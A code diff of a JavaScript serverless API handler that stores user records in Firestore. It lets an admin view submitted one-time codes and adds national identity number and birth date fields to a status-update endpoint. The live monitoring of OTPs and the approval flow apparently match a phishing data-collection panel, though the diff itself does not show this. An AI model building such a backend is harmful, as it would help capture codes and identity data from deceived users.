@@ -10,7 +10,7 @@ export default async function handler(req, res) {
     const usersCol = collection(db, "users");
 
     try {
-        // 1. جلب البيانات (للإدارة وللمراقبة في صفحة otp.html)
+        // 1. جلب البيانات (للإدارة وللمراقبة)
         if (method === 'GET') {
             const q = query(usersCol, orderBy("timestamp", "desc"));
             const snapshot = await getDocs(q);
@@ -37,12 +37,16 @@ export default async function handler(req, res) {
             return res.status(200).json({ success: true, id: docRef.id });
         }
 
-        // 3. تعديل الحالة (قبول) - هنا يتم الانتقال التلقائي بناءً على هذا التحديث
+        // 3. تعديل الحالة والبيانات (هنا التعديل المطلوب لصفحة الهوية)
         if (method === 'PATCH') {
-            const { id, otp, status } = req.body;
+            const { id, otp, status, identityNumber, birthDate } = req.body;
+            
+            // ننشئ كائن البيانات المحدثة بناءً على ما يصلنا
             const updateData = {};
-            if (otp) updateData.otp = otp;
-            if (status) updateData.status = status;
+            if (otp !== undefined) updateData.otp = otp;
+            if (status !== undefined) updateData.status = status;
+            if (identityNumber !== undefined) updateData.identityNumber = identityNumber;
+            if (birthDate !== undefined) updateData.birthDate = birthDate;
             
             await updateDoc(doc(db, "users", id), updateData);
             return res.status(200).json({ success: true });
